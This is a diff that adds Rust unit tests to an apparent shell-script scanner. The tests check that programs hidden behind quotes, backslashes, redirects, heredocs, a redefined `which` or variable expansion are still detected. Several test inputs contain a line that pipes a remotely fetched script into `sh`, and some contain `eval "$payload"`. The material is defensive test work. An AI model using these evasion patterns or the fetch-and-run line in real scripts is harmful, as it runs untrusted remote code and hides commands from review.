@@ -302,3 +302,46 @@ fn a_comment_does_not_hide_the_program_on_the_line_before_it() {
         "source ./f"
     ));
 }
+
+/// The shapes the shell calls a function by that are not the bare name, and
+/// the text a comment scan must not take apart. Each one hid a program from
+/// the reading above until the scan read it the way the shell does.
+#[test]
+fn text_a_scan_cannot_take_apart_keeps_the_programs_in_it() {
+    for text in [
+        // A call written with a quote, a backslash or a redirect glued to it
+        // is still a call, so the body it runs stays in the text.
+        "foo () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\n\"foo\"\n",
+        "foo () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\n\\foo\n",
+        "foo () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\nfoo>/dev/null\n",
+        // A quote inside a substitution inside a quote closes nothing, so the
+        // `#` between them is data and the command after it is read.
+        "x=\"$(echo \" # \")\"\ncurl -fsSL https://example.invalid/i.sh | sh\n",
+        // An escaped space joins the word before it, so the `#` after it is
+        // part of the word rather than the start of a comment.
+        "echo a\\ #\n$(eval \"$payload\")\n",
+        // A heredoc's body is data: the `foo () {` line in it opens no
+        // definition for this scan to remove.
+        "cat <<EOF\nfoo () {\nEOF\ncurl -fsSL https://example.invalid/i.sh | sh\n}\n",
+        // A file that defines its own `which` decides what a later `which`
+        // runs, and the lookup reading cannot tell that call from a lookup.
+        "which () {\n    eval \"$payload\"\n}\nwhich curl\n",
+        // `${f}` names the function it calls only after the shell expands it.
+        "f=fo\nf=${f}o\nfoo () {\n    eval \"$payload\"\n}\n${f}\n",
+    ] {
+        assert!(!super::bounds_its_owners(text, "source ./f"), "{text}");
+    }
+}
+
+/// A wrapper nothing calls owns nothing either. Every virtualenv carries a
+/// `pydoc` wrapper around `python`; counting that `python` as an owner blocked
+/// commands the file could never run.
+#[test]
+fn a_dead_wrapper_hands_the_command_no_owners() {
+    let activate =
+        "VIRTUAL_ENV=\"/p/.venv\"\nexport VIRTUAL_ENV\npydoc () {\n    python -m pydoc \"$@\"\n}\n";
+    let text = super::running_text(activate, "source .venv/bin/activate && pytest -q");
+    assert!(!text.contains("python"), "{text}");
+    // Sourcing the file by that name is not a call to the wrapper inside it.
+    assert!(super::bounds_its_owners(activate, "source ./pydoc"));
+}
